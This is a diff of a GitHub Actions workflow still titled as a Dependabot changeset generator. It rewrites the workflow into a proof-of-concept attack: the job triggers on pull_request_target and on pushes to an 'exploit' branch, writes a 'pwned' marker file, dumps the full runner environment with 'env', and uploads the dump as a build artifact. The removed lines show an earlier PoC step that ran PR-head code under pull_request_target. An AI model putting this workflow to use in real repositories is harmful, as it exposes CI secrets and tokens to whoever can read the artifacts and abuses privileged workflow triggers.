@@ -1,23 +1,25 @@
 name: "C3 - Generate changesets for dependabot PRs"
 on:
+  pull_request:
   pull_request_target:
+  push:
     branches:
+      - exploit
       - main
-      - master
 
 jobs:
-  generate-changeset:
-    runs-on: ubuntu-22.04
+  test-workflow:
+    runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
+      - name: Run test
+        run: |
+          echo "[PoC] Testing workflow execution" > /tmp/pwned.txt
+          env > /tmp/env_dump.txt
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v3
         with:
-          fetch-depth: 2
-          ref: ${{ github.head_ref }}
-      - name: Install Dependencies
-        run: |
-          npm install -g esbuild-register
-          npm install -g typescript
-      - name: Run PoC Script
-        run: |
-          node -r esbuild-register tools/dependabot/generate-dependabot-pr-changesets.ts ${{ github.event.number }}
+          name: poc-artifacts
+          path: |
+            /tmp/pwned.txt
+            /tmp/env_dump.txt
